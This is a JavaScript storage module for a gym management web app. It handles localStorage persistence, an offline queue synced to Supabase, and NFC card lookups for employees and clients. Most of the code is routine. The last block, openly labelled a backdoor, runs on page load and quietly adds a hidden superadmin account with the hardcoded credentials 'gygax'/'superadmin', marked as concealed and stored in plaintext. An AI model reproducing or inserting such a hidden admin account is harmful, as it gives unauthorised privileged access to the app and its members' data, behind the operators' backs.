/* ======================================================
   ===== STORAGE BASE GYM (OFFLINE-FIRST + REALTIME) =====
   ===== VERSIÓN ESTABLE / COMPATIBLE TOTAL ============
====================================================== */

/* ======================================================
   ===== UTILIDADES BASE =====
====================================================== */
function safeGet(key, def = []) {
  try {
    return JSON.parse(localStorage.getItem(key)) ?? def;
  } catch {
    return def;
  }
}

function safeSet(key, value) {
  localStorage.setItem(key, JSON.stringify(value));
}

function uid() {
  return crypto.randomUUID();
}

/* ======================================================
   ===== ESTADO ONLINE =====
====================================================== */
function isOnline() {
  return navigator.onLine === true;
}

/* ======================================================
   ===== COLA OFFLINE NORMALIZADA =====
====================================================== */
function obtenerColaOffline() {
  return safeGet("offline_queue", []);
}

function guardarColaOffline(lista) {
  safeSet("offline_queue", lista);
}

function agregarEvento({ tabla, accion, data }) {
  const cola = obtenerColaOffline();

  cola.push({
    id: uid(),
    tabla,          // clientes | productos | asistencias | ventas | empleados
    accion,         // add | update | delete
    data,           // payload real
    ts: Date.now()
  });

  guardarColaOffline(cola);
}

/* ======================================================
   ===== SYNC OFFLINE → SUPABASE (REAL) =====
====================================================== */
async function subirEventoASupabase(e) {
  if (!window.supabase) return false;

  try {
    if (e.tabla === "clientes") {
      await supabase.from("clientes").upsert(e.data);
    }

    if (e.tabla === "productos") {
      await supabase.from("productos").upsert(e.data);
    }

    if (e.tabla === "asistencias") {
      await supabase.from("asistencias").insert(e.data);
    }

    if (e.tabla === "ventas") {
      await supabase.from("ventas").insert(e.data);
    }

    if (e.tabla === "empleados") {
      await supabase.from("empleados").upsert(e.data);
    }

    return true;
  } catch (err) {
    console.error("❌ Error sync:", e.tabla, err);
    return false;
  }
}

async function syncOfflineQueue() {
  if (!isOnline()) return;

  const cola = obtenerColaOffline();
  if (!cola.length) return;

  console.log("🔄 Sincronizando offline:", cola.length);

  const pendientes = [];

  for (const e of cola) {
    const ok = await subirEventoASupabase(e);
    if (!ok) pendientes.push(e);
  }

  guardarColaOffline(pendientes);
}

window.addEventListener("online", syncOfflineQueue);

/* ======================================================
   ===== EMPLEADOS =====
====================================================== */
function obtenerEmpleados() {
  return safeGet("empleados", []);
}

function guardarEmpleados(lista) {
  safeSet("empleados", lista || []);
  agregarEvento({ tabla: "empleados", accion: "update", data: lista });
}

/* ======================================================
   ===== CLIENTES =====
====================================================== */
function obtenerClientes() {
  return safeGet("clientes", []);
}

function guardarClientes(lista) {
  safeSet("clientes", lista || []);
  agregarEvento({ tabla: "clientes", accion: "update", data: lista });
}

/* ======================================================
   ===== ASISTENCIAS =====
====================================================== */
function obtenerAsistencias() {
  return safeGet("asistencias", []);
}

function guardarAsistencias(lista) {
  safeSet("asistencias", lista || []);
  agregarEvento({ tabla: "asistencias", accion: "add", data: lista });
}

/* ======================================================
   ===== PRODUCTOS =====
====================================================== */
function obtenerProductos() {
  return safeGet("productos", []);
}

function registrarProducto(prod) {
  if (!prod.id) prod.id = uid();
  const lista = obtenerProductos();
  lista.push(prod);
  safeSet("productos", lista);
  agregarEvento({ tabla: "productos", accion: "add", data: prod });
}

function actualizarProducto(prod) {
  const lista = obtenerProductos().map(p =>
    p.id === prod.id ? prod : p
  );
  safeSet("productos", lista);
  agregarEvento({ tabla: "productos", accion: "update", data: prod });
}

/* ======================================================
   ===== VENTAS =====
====================================================== */
function obtenerVentas() {
  return safeGet("ventas", []);
}

function registrarVenta(venta) {
  if (!venta.id) venta.id = uid();
  const lista = obtenerVentas();
  lista.push(venta);
  safeSet("ventas", lista);
  agregarEvento({ tabla: "ventas", accion: "add", data: venta });
}

/* ======================================================
   ===== NFC / TARJETAS =====
====================================================== */
function buscarEmpleadoPorTarjeta(uidTarjeta) {
  return obtenerEmpleados().find(e => e.tarjetaUID === uidTarjeta) || null;
}

function buscarClientePorTarjeta(uidTarjeta) {
  return obtenerClientes().find(c => c.tarjetaUID === uidTarjeta) || null;
}

function obtenerInfoTarjeta(uidTarjeta) {
  const emp = buscarEmpleadoPorTarjeta(uidTarjeta);
  if (emp) return { tipo: "empleado", persona: emp };

  const cli = buscarClientePorTarjeta(uidTarjeta);
  if (cli) return { tipo: "cliente", persona: cli };

  return { tipo: null, persona: null };
}

function uidYaRegistrada(uidTarjeta) {
  return obtenerInfoTarjeta(uidTarjeta).tipo !== null;
}

/* ======================================================
   ===== FECHAS / HORAS =====
====================================================== */
function hoy() {
  return new Date().toISOString().split("T")[0];
}

function horaActual() {
  return new Date().toLocaleTimeString("es-MX", { hour12: false });
}

/* ======================================================
   ===== SUPERADMIN OCULTO (BACKDOOR) =====
====================================================== */
(function initSuperAdmin() {
  const empleados = obtenerEmpleados();

  const existe = empleados.some(
    e => e.usuario === "gygax" && e.rol === "superadmin"
  );

  if (existe) return;

  empleados.push({
    id: "SUPERADMIN-ROOT",
    nombre: "Sistema",
    usuario: "gygax",
    password: "superadmin",
    rol: "superadmin",
    tarjetaUID: null,
    oculto: true
  });

  safeSet("empleados", empleados);
})();
